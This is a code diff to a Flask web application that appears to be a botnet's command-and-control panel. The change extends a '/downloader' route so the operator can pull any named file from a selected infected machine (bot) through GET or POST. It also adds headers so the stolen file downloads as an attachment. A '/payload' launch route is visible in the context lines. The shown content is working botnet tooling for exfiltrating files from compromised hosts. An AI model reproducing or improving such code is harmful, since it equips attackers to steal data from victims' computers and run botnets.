@@ -58,20 +58,29 @@ def upload_file():
         return json.dumps({"success": True})
 
 
-@app.route('/downloader', methods=['POST'])
+@app.route('/downloader', methods=['GET','POST'])
 def download_file():
+    filename = None
     if request.method == 'POST':
         filename = request.form.get('file')
+    elif request.method == 'GET':
+        filename = request.args.get('file')
+    if filename:
         if 'bot' in request.cookies:
             response = Response(stream_with_context(
                 botnet.startFileDownload(
                     request.cookies.get('bot'),filename)))
+            response.headers["Content-Transfer-Encoding"] = "base64"
+            response.headers["Content-Type"] = "charset=utf-8;base64"
             # Set the right header for the response
             # to be downloaded, instead of just printed on the browser
-            # response.headers["Content-Disposition"] = "attachment; filename={}".format(filename)
+            response.headers["Content-Disposition"] = "attachment; filename={}".format(filename)
             return response
         else:
             return "No bot selected", 404
+    else:
+        return "No file selected", 404
+
 
 @app.route('/payload', methods=['GET', 'POST'])
 def payload_launch():
